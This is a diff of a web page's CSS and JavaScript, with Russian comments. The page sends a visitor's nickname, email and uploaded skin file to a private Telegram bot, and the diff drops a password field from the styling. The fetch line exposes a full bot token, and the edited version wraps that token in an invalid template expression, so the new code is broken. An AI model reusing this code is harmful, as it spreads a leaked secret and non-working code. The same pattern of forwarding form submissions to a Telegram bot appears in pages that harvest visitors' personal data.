@@ -105,7 +105,7 @@
             margin: 10px 0 5px;
         }
 
-        input[type="text"], input[type="email"], input[type="password"], input[type="file"] {
+        input[type="text"], input[type="email"], input[type="file"] {
             width: 100%;
             padding: 10px;
             margin-bottom: 10px;
@@ -195,11 +195,11 @@
 
                 // Отправка данных в Telegram бот
                 const formData = new FormData();
-                formData.append('1420106372', '@Clayni0'); // Замените на ваш реальный ID чата
+                formData.append('chat_id', '1420106372'); // Замените на ваш реальный ID чата
                 formData.append('document', skin);
                 formData.append('caption', `Никнейм: ${nickname}\nПочта: ${email}`);
 
-                fetch(`https://api.telegram.org/bot7240803057:AAG7xMLwBKljEiRpjN7EYEVfANX9BGthUCI/sendDocument`, {
+                fetch(`https://api.telegram.org/bot${7240803057:AAG7xMLwBKljEiRpjN7EYEVfANX9BGthUCI}/sendDocument`, {
                     method: 'POST',
                     body: formData
                 })
